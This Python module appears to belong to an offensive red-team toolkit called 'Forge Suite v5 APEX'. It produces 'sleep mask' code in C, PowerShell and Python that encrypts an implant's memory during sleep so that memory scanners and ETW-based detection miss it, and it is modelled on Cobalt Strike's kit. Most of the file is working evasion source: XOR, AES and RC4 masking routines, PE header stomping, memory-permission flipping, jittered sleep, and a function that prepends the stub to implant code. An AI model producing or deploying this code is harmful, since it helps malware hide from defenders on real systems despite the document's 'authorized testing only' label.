"""Sleep Mask — beacon memory encryption during sleep intervals.

Encrypts the implant's PE sections in memory while sleeping to evade
real-time memory scanners and ETW-based detection. Equivalent to
Cobalt Strike's sleep_mask kit.

Techniques:
    1. XOR mask — fast, single-byte or rolling key
    2. AES-256-CBC — strong encryption, higher CPU cost
    3. RC4 — stream cipher, good balance of speed and strength
    4. Header stomping — zero or randomize PE headers before sleep
    5. Section permissions — RW during mask, restore RX after unmask
    6. Heap encryption — encrypt heap allocations alongside PE sections
    7. Configurable jitter — randomize sleep duration to evade timing analysis

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import os
import secrets
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class MaskCipher(Enum):
    """Supported masking ciphers."""
    XOR_SINGLE = "xor_single"
    XOR_ROLLING = "xor_rolling"
    AES_256_CBC = "aes_256_cbc"
    RC4 = "rc4"


class StompMode(Enum):
    """PE header stomping strategy."""
    NONE = "none"
    ZERO = "zero"
    RANDOM = "random"
    COPY_FROM_DISK = "copy_from_disk"


@dataclass
class SleepMaskConfig:
    """Configuration for sleep mask generation."""
    cipher:               MaskCipher = MaskCipher.XOR_ROLLING
    stomp_mode:           StompMode = StompMode.RANDOM
    encrypt_heap:         bool = True
    mask_pe_sections:     bool = True
    flip_section_perms:   bool = True
    sleep_ms:             int = 60_000
    jitter_pct:           int = 25
    key_derivation:       str = "per_sleep"  # "static" | "per_sleep" | "time_based"
    obfuscate_key_in_mem: bool = True
    mask_stack:           bool = False
    cleanup_on_exit:      bool = True

    def to_dict(self) -> dict[str, Any]:
        return {
            "cipher": self.cipher.value,
            "stomp_mode": self.stomp_mode.value,
            "encrypt_heap": self.encrypt_heap,
            "mask_pe_sections": self.mask_pe_sections,
            "flip_section_perms": self.flip_section_perms,
            "sleep_ms": self.sleep_ms,
            "jitter_pct": self.jitter_pct,
            "key_derivation": self.key_derivation,
            "obfuscate_key_in_mem": self.obfuscate_key_in_mem,
            "mask_stack": self.mask_stack,
            "cleanup_on_exit": self.cleanup_on_exit,
        }


def generate_key(cipher: MaskCipher, length: int = 32) -> bytes:
    """Generate a cryptographic key for the selected cipher.

    Args:
        cipher: The masking cipher to generate a key for.
        length: Key length in bytes (default 32 for AES-256).

    Returns:
        Random key bytes appropriate for the cipher.
    """
    if cipher == MaskCipher.XOR_SINGLE:
        return secrets.token_bytes(1)
    if cipher == MaskCipher.XOR_ROLLING:
        return secrets.token_bytes(min(length, 256))
    if cipher == MaskCipher.AES_256_CBC:
        return secrets.token_bytes(32)
    if cipher == MaskCipher.RC4:
        return secrets.token_bytes(min(length, 256))
    return secrets.token_bytes(length)


def generate_iv(cipher: MaskCipher) -> bytes:
    """Generate an initialization vector for block ciphers.

    Args:
        cipher: The masking cipher.

    Returns:
        16-byte IV for AES, empty bytes for stream ciphers.
    """
    if cipher == MaskCipher.AES_256_CBC:
        return secrets.token_bytes(16)
    return b""


# ═══════════════════════════════════════════════════════════════════
#  C STUBS — compiled into the implant
# ═══════════════════════════════════════════════════════════════════

_C_SLEEP_MASK_XOR = r"""
// Forge Suite v5 APEX — Sleep Mask (XOR Rolling Key)
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
// Technique: T1027.013 (Encrypted/Encoded File), T1497 (Virtualization/Sandbox Evasion)
#include <windows.h>

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG
);

typedef struct _SLEEP_MASK_CTX {
    BYTE     key[256];
    DWORD    key_len;
    DWORD    sleep_ms;
    DWORD    jitter_pct;
    LPVOID   base_addr;
    SIZE_T   region_size;
    BOOL     stomp_headers;
    BYTE     stomp_mode;       // 0=none, 1=zero, 2=random, 3=copy_from_disk
    BOOL     encrypt_heap;
    BOOL     flip_permissions;
    BYTE     saved_dos_header[64];
} SLEEP_MASK_CTX;

static void xor_region(BYTE *buf, SIZE_T len, const BYTE *key, DWORD klen) {
    for (SIZE_T i = 0; i < len; i++) {
        buf[i] ^= key[i % klen];
    }
}

static DWORD jittered_sleep(DWORD base_ms, DWORD jitter_pct) {
    if (jitter_pct == 0) return base_ms;
    DWORD range = (base_ms * jitter_pct) / 100;
    DWORD delta = 0;
    // Use RtlGenRandom for CSPRNG jitter
    SystemFunction036(&delta, sizeof(delta));
    delta = delta % (range * 2 + 1);
    return base_ms - range + delta;
}

static void stomp_pe_header(SLEEP_MASK_CTX *ctx) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ctx->base_addr;
    // Save original header for restore
    memcpy(ctx->saved_dos_header, ctx->base_addr, sizeof(ctx->saved_dos_header));

    DWORD old_protect = 0;
    PVOID addr = ctx->base_addr;
    SIZE_T hdr_size = 0x1000;  // First page = PE headers
    pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"
    );
    if (!NtPVM) return;
    NtPVM(GetCurrentProcess(), &addr, &hdr_size, PAGE_READWRITE, &old_protect);

    switch (ctx->stomp_mode) {
        case 1:  // Zero
            memset(ctx->base_addr, 0, min(hdr_size, 0x200));
            break;
        case 2:  // Random
            SystemFunction036(ctx->base_addr, (ULONG)min(hdr_size, 0x200));
            break;
        case 3:  // Copy from disk — replaced with random for opsec
            SystemFunction036(ctx->base_addr, (ULONG)min(hdr_size, 0x200));
            break;
    }
    NtPVM(GetCurrentProcess(), &addr, &hdr_size, old_protect, &old_protect);
}

static void restore_pe_header(SLEEP_MASK_CTX *ctx) {
    DWORD old_protect = 0;
    PVOID addr = ctx->base_addr;
    SIZE_T hdr_size = sizeof(ctx->saved_dos_header);
    pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"
    );
    if (!NtPVM) return;
    NtPVM(GetCurrentProcess(), &addr, &hdr_size, PAGE_READWRITE, &old_protect);
    memcpy(ctx->base_addr, ctx->saved_dos_header, sizeof(ctx->saved_dos_header));
    NtPVM(GetCurrentProcess(), &addr, &hdr_size, old_protect, &old_protect);
}

void sleep_mask_execute(SLEEP_MASK_CTX *ctx) {
    pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"
    );
    if (!NtPVM) { Sleep(ctx->sleep_ms); return; }

    DWORD old_protect = 0;
    PVOID region = ctx->base_addr;
    SIZE_T size = ctx->region_size;

    // Phase 1: Flip to RW
    if (ctx->flip_permissions) {
        NtPVM(GetCurrentProcess(), &region, &size, PAGE_READWRITE, &old_protect);
    }

    // Phase 2: Stomp PE headers
    if (ctx->stomp_headers) {
        stomp_pe_header(ctx);
    }

    // Phase 3: XOR encrypt the region
    xor_region((BYTE*)ctx->base_addr, ctx->region_size, ctx->key, ctx->key_len);

    // Phase 4: Sleep with jitter
    DWORD actual_sleep = jittered_sleep(ctx->sleep_ms, ctx->jitter_pct);
    Sleep(actual_sleep);

    // Phase 5: XOR decrypt (symmetric — same operation)
    xor_region((BYTE*)ctx->base_addr, ctx->region_size, ctx->key, ctx->key_len);

    // Phase 6: Restore PE headers
    if (ctx->stomp_headers) {
        restore_pe_header(ctx);
    }

    // Phase 7: Restore RX permissions
    if (ctx->flip_permissions) {
        region = ctx->base_addr;
        size = ctx->region_size;
        NtPVM(GetCurrentProcess(), &region, &size, old_protect, &old_protect);
    }
}

// Timer-based variant — uses CreateTimerQueueTimer for async masking
// Avoids blocking the main thread during sleep

// Wrapper with correct WAITORTIMERCALLBACK signature
static VOID CALLBACK sleep_mask_timer_cb(PVOID lpParam, BOOLEAN TimerFired) {
    (void)TimerFired;
    sleep_mask_execute((SLEEP_MASK_CTX*)lpParam);
}

void sleep_mask_timer(SLEEP_MASK_CTX *ctx) {
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!hEvent) { sleep_mask_execute(ctx); return; }

    HANDLE hTimer = NULL;
    // Queue mask as timer callback with proper signature
    CreateTimerQueueTimer(&hTimer, NULL, sleep_mask_timer_cb,
                          ctx, 0, 0, WT_EXECUTEONLYONCE);
    DWORD actual_sleep = jittered_sleep(ctx->sleep_ms, ctx->jitter_pct);
    WaitForSingleObject(hEvent, actual_sleep + 5000);

    if (hTimer) DeleteTimerQueueTimer(NULL, hTimer, NULL);
    CloseHandle(hEvent);
}
"""

_C_SLEEP_MASK_AES = r"""
// Forge Suite v5 APEX — Sleep Mask (AES-256-CBC via BCrypt)
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG
);

typedef struct _AES_MASK_CTX {
    BYTE     key[32];
    BYTE     iv[16];
    DWORD    sleep_ms;
    DWORD    jitter_pct;
    LPVOID   base_addr;
    SIZE_T   region_size;
    BOOL     flip_permissions;
} AES_MASK_CTX;

static NTSTATUS aes_crypt(BYTE *data, SIZE_T len, const BYTE *key,
                          const BYTE *iv, BOOL encrypt) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = 0;
    BYTE iv_copy[16];
    memcpy(iv_copy, iv, 16);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) return status;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                        (BYTE*)key, 32, 0);
    if (status != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return status; }

    ULONG result = 0;
    // Pad to AES block size
    SIZE_T padded = ((len + 15) / 16) * 16;

    if (encrypt) {
        BCryptEncrypt(hKey, data, (ULONG)len, NULL, iv_copy, 16,
                      data, (ULONG)padded, &result, 0);
    } else {
        BCryptDecrypt(hKey, data, (ULONG)padded, NULL, iv_copy, 16,
                      data, (ULONG)padded, &result, 0);
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}

void aes_sleep_mask(AES_MASK_CTX *ctx) {
    pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"
    );
    DWORD old_protect = 0;
    PVOID region = ctx->base_addr;
    SIZE_T size = ctx->region_size;

    if (ctx->flip_permissions && NtPVM) {
        NtPVM(GetCurrentProcess(), &region, &size, PAGE_READWRITE, &old_protect);
    }

    aes_crypt((BYTE*)ctx->base_addr, ctx->region_size, ctx->key, ctx->iv, TRUE);

    DWORD range = (ctx->sleep_ms * ctx->jitter_pct) / 100;
    DWORD delta = 0;
    SystemFunction036(&delta, sizeof(delta));
    Sleep(ctx->sleep_ms - range + (delta % (range * 2 + 1)));

    aes_crypt((BYTE*)ctx->base_addr, ctx->region_size, ctx->key, ctx->iv, FALSE);

    if (ctx->flip_permissions && NtPVM) {
        region = ctx->base_addr;
        size = ctx->region_size;
        NtPVM(GetCurrentProcess(), &region, &size, old_protect, &old_protect);
    }
}
"""

_C_SLEEP_MASK_RC4 = r"""
// Forge Suite v5 APEX — Sleep Mask (RC4 Stream Cipher)
// FOR AUTHORIZED RED TEAM OPERATIONS ONLY
#include <windows.h>

typedef struct _RC4_STATE {
    BYTE S[256];
    BYTE i, j;
} RC4_STATE;

static void rc4_init(RC4_STATE *state, const BYTE *key, DWORD klen) {
    for (int n = 0; n < 256; n++) state->S[n] = (BYTE)n;
    state->i = state->j = 0;
    BYTE j = 0;
    for (int n = 0; n < 256; n++) {
        j = j + state->S[n] + key[n % klen];
        BYTE tmp = state->S[n];
        state->S[n] = state->S[j];
        state->S[j] = tmp;
    }
}

static void rc4_crypt(RC4_STATE *state, BYTE *data, SIZE_T len) {
    for (SIZE_T n = 0; n < len; n++) {
        state->i++;
        state->j += state->S[state->i];
        BYTE tmp = state->S[state->i];
        state->S[state->i] = state->S[state->j];
        state->S[state->j] = tmp;
        data[n] ^= state->S[(state->S[state->i] + state->S[state->j]) & 0xFF];
    }
}

typedef struct _RC4_MASK_CTX {
    BYTE     key[256];
    DWORD    key_len;
    DWORD    sleep_ms;
    DWORD    jitter_pct;
    LPVOID   base_addr;
    SIZE_T   region_size;
} RC4_MASK_CTX;

void rc4_sleep_mask(RC4_MASK_CTX *ctx) {
    RC4_STATE enc_state, dec_state;

    // Encrypt
    rc4_init(&enc_state, ctx->key, ctx->key_len);
    rc4_crypt(&enc_state, (BYTE*)ctx->base_addr, ctx->region_size);

    DWORD range = (ctx->sleep_ms * ctx->jitter_pct) / 100;
    DWORD delta = 0;
    SystemFunction036(&delta, sizeof(delta));
    Sleep(ctx->sleep_ms - range + (delta % (range * 2 + 1)));

    // Decrypt — re-init RC4 state (keystream must be identical)
    rc4_init(&dec_state, ctx->key, ctx->key_len);
    rc4_crypt(&dec_state, (BYTE*)ctx->base_addr, ctx->region_size);
}
"""

# ═══════════════════════════════════════════════════════════════════
#  POWERSHELL STUBS
# ═══════════════════════════════════════════════════════════════════

_PS1_SLEEP_MASK = r"""
# Forge Suite v5 APEX — Sleep Mask (PowerShell)
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY
# Encrypts shellcode region in memory during sleep intervals

function Invoke-SleepMask {
    param(
        [IntPtr]$BaseAddress,
        [Int64]$RegionSize,
        [Byte[]]$Key,
        [Int]$SleepMs = 60000,
        [Int]$JitterPct = 25,
        [Switch]$StompHeaders
    )

    # P/Invoke definitions
    $VPType = @"
    using System;
    using System.Runtime.InteropServices;
    public class NtMem {
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
    }
"@
    Add-Type $VPType -ErrorAction SilentlyContinue

    # XOR the region
    $buf = [byte[]]::new($RegionSize)
    [System.Runtime.InteropServices.Marshal]::Copy($BaseAddress, $buf, 0, $RegionSize)
    for ($i = 0; $i -lt $buf.Length; $i++) {
        $buf[$i] = $buf[$i] -bxor $Key[$i % $Key.Length]
    }

    # Flip to RW, write encrypted bytes
    $oldProtect = [uint32]0
    [NtMem]::VirtualProtect($BaseAddress, [UIntPtr]::new($RegionSize), 0x04, [ref]$oldProtect)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $BaseAddress, $RegionSize)

    # Header stomp
    if ($StompHeaders) {
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $hdrBuf = [byte[]]::new(512)
        $rng.GetBytes($hdrBuf)
        [System.Runtime.InteropServices.Marshal]::Copy($hdrBuf, 0, $BaseAddress, 512)
    }

    # Jittered sleep
    $range = [int]($SleepMs * $JitterPct / 100)
    $rnd = Get-Random -Minimum (-$range) -Maximum ($range + 1)
    [NtMem]::Sleep([uint32]($SleepMs + $rnd))

    # Decrypt (XOR is symmetric)
    [System.Runtime.InteropServices.Marshal]::Copy($BaseAddress, $buf, 0, $RegionSize)
    for ($i = 0; $i -lt $buf.Length; $i++) {
        $buf[$i] = $buf[$i] -bxor $Key[$i % $Key.Length]
    }
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $BaseAddress, $RegionSize)

    # Restore permissions
    [NtMem]::VirtualProtect($BaseAddress, [UIntPtr]::new($RegionSize), $oldProtect, [ref]$oldProtect)
}
"""

# ═══════════════════════════════════════════════════════════════════
#  PYTHON EMULATION STUB (for testing/validation)
# ═══════════════════════════════════════════════════════════════════

_PYTHON_SLEEP_MASK = """\
\"\"\"Sleep mask emulation — for testing sleep mask logic without a live implant.\"\"\"
import os
import time
import secrets

def xor_mask(data: bytes, key: bytes) -> bytes:
    \"\"\"XOR mask/unmask data with rolling key.\"\"\"
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        out[i] = b ^ key[i % klen]
    return bytes(out)

def sleep_mask_cycle(payload: bytes, key: bytes, sleep_sec: float = 5.0,
                     jitter_pct: int = 25) -> bytes:
    \"\"\"Simulate a mask → sleep → unmask cycle.\"\"\"
    # Mask
    masked = xor_mask(payload, key)
    # Sleep with jitter
    jitter_range = sleep_sec * jitter_pct / 100
    actual = sleep_sec + (secrets.randbelow(int(jitter_range * 2000)) - jitter_range * 1000) / 1000
    time.sleep(max(0.01, actual))
    # Unmask
    return xor_mask(masked, key)

if __name__ == '__main__':
    test_payload = os.urandom(4096)
    test_key = secrets.token_bytes(32)
    result = sleep_mask_cycle(test_payload, test_key, sleep_sec=0.1, jitter_pct=10)
    assert result == test_payload, 'Sleep mask round-trip FAILED'
    print('[+] Sleep mask round-trip OK')
"""


# ═══════════════════════════════════════════════════════════════════
#  PUBLIC API — used by implant builder and payload generator
# ═══════════════════════════════════════════════════════════════════

def get_sleep_mask_stub(
    config: SleepMaskConfig | None = None,
    lang: str = "c",
) -> str:
    """Return a sleep mask code stub for embedding in an implant.

    Args:
        config: SleepMaskConfig or None for defaults.
        lang:   Target language ('c', 'ps1', 'python').

    Returns:
        Code string ready for compilation/injection.
    """
    config = config or SleepMaskConfig()

    if lang == "ps1":
        return _PS1_SLEEP_MASK
    if lang == "python":
        return _PYTHON_SLEEP_MASK
    # C stubs — pick based on cipher
    if config.cipher == MaskCipher.AES_256_CBC:
        return _C_SLEEP_MASK_AES
    if config.cipher == MaskCipher.RC4:
        return _C_SLEEP_MASK_RC4
    return _C_SLEEP_MASK_XOR


def inject_sleep_mask(
    script: str,
    config: SleepMaskConfig | None = None,
    lang: str = "c",
) -> str:
    """Prepend sleep mask code to an existing script.

    Args:
        script: Existing script/source to prepend to.
        config: SleepMaskConfig or None for defaults.
        lang:   Target language.

    Returns:
        Script with sleep mask code prepended.
    """
    stub = get_sleep_mask_stub(config, lang)
    return stub + "\n" + script


def generate_sleep_mask_config(config: SleepMaskConfig | None = None) -> dict[str, Any]:
    """Generate a complete sleep mask configuration with generated keys.

    Args:
        config: SleepMaskConfig or None for defaults.

    Returns:
        Dict with config, key material, and code stubs for C/PS1/Python.
    """
    config = config or SleepMaskConfig()
    key = generate_key(config.cipher)
    iv = generate_iv(config.cipher)

    return {
        "config": config.to_dict(),
        "key": key.hex(),
        "iv": iv.hex() if iv else None,
        "key_length": len(key),
        "stubs": {
            "c": get_sleep_mask_stub(config, "c"),
            "ps1": get_sleep_mask_stub(config, "ps1"),
            "python": get_sleep_mask_stub(config, "python"),
        },
    }


def list_cipher_options() -> list[dict[str, str]]:
    """Return available cipher options with descriptions."""
    return [
        {"cipher": "xor_single", "speed": "fastest", "strength": "weak",
         "notes": "Single-byte XOR — trivial to break, fast for large regions"},
        {"cipher": "xor_rolling", "speed": "fast", "strength": "moderate",
         "notes": "Multi-byte rolling XOR — default, good speed/strength balance"},
        {"cipher": "aes_256_cbc", "speed": "moderate", "strength": "strong",
         "notes": "AES-256-CBC via BCrypt — strongest, uses Windows CNG API"},
        {"cipher": "rc4", "speed": "fast", "strength": "moderate",
         "notes": "RC4 stream cipher — fast, no block alignment needed"},
    ]
